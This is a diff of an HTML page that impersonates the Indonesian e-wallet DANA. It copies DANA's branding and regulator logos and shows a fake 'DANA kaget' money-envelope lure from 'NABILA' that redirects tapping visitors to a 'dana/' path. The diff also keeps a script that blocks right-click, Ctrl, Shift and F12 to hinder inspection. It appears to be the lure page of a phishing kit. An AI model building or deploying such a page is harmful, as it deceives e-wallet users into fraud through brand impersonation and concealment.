@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
     <head>
@@ -13,36 +14,36 @@
         <meta property="og:url" content="https://dana.id">
         <meta property="og:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!"><meta property="twitter:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
         <link data-n-head="ssr" rel="icon" type="image/x-icon" href="https://www.dana.id/favicon.ico">
-        <link rel="stylesheet" href="ast/amplop/index.css">
-        </head>
-        <body>
-    <div onclick="location.href='dana/'" class="container_amplop" style="display: none;">
-        <nav class="navYondaHosting">
-            <img class="closed" src="./ast/amplop/img/closed.png" alt="" />
-            <h2>DANA kaget</h2>
-        </nav>
+        <link rel="stylesheet" href="ast/index.css">
+    </head>
+<body>
+<div class="container_yondahost" style="display:none;">
 
-      <div class="punyaDaget">
-            <img src="ast/amplop/img/Nabila.jpg" alt="" />
-            <span>Dari</span>
-            <br />
-            <h4>NABILA</h4>
-        </div>
-    </div>
+  <div class="text_amplop">
+    <h4>Tap amplop buat <br /> liat DANA kaget</h4>
+  </div>
+  <img onclick="location.href='dana/'" src="./ast/img/amplop1_1_1.jpg" alt="" class="amplop"/>
+  <div class="punyadaget">
+      <img src="ast/amplop/img/Nabila.jpg" alt="" />
+      <div class="group_text">
+         <h5>Dari</h5>
+         <h3>NABILA</h3>
+      </div>
+  </div>
+</div>
 
-     <div sty class="start" style="display:none;">
-      <img class="logo" src="ast/amplop/img/logoDana.png">
+<div sty class="start" style="display:none;">
+      <img class="logo" src="ast/img/logoDana.png">
         <div class="footimg">
-         <img src="ast/amplop/img/bi.png" alt="">
-         <img src="ast/amplop/img/kom.png" alt="">
+         <img src="ast/img/bi.png" alt="">
+         <img src="ast/img/kom.png" alt="">
          <p>DANA Indonesia terdaftar dan diawasi<br>oleh Bank Indonesia dan Kominfo</p>
       </div>
     </div>
 
-
 <script src="https://code.jquery.com/jquery-3.5.1.min.js">
 </script>
-<script src="ast/amplop/jquery.mask.min.js"></script>
+<script src="ast/jquery.mask.min.js"></script>
 
 
 <script>
@@ -53,40 +54,41 @@ window.onload = function()
             setTimeout(function(){
                 $(".start").fadeOut(1000);
                 setTimeout(function(){
-                   $(".container_amplop").fadeIn(200);
-                   $(".container_amplop").focus();
+                   $(".container_yondahost").fadeIn(200);
+                   $(".container_yondahost").focus();
                 },1000);
             },2000);
         },500);
 }
 </script>
+
 <script>
     var addHandler = function (element, type, handler) {
-  if (element.addEventListener) {
-    element.addEventListener(type, handler, false);
-  } else if (element.attachEvent) {
-    element.attachEvent("on" + type, handler);
-  } else {
-    element["on" + type] = handler;
-  }
+	if (element.addEventListener) {
+		element.addEventListener(type, handler, false);
+	} else if (element.attachEvent) {
+		element.attachEvent("on" + type, handler);
+	} else {
+		element["on" + type] = handler;
+	}
 };
 
 var preventDefault = function (event) {
-  if (event.preventDefault) {
-    event.preventDefault();
-  } else {
-    event.returnValue = false;
-  }
+	if (event.preventDefault) {
+		event.preventDefault();
+	} else {
+		event.returnValue = false;
+	}
 };
 
 addHandler(window, "contextmenu", function (event) {
-  preventDefault(event);
+	preventDefault(event);
 });
 
 document.onkeydown = function (event) {
-  if(event.ctrlKey || event.shiftKey || event.keyCode == 123) {
-    return false;
-  }
+	if(event.ctrlKey || event.shiftKey || event.keyCode == 123) {
+		return false;
+	}
 };
 </script>
 </body>
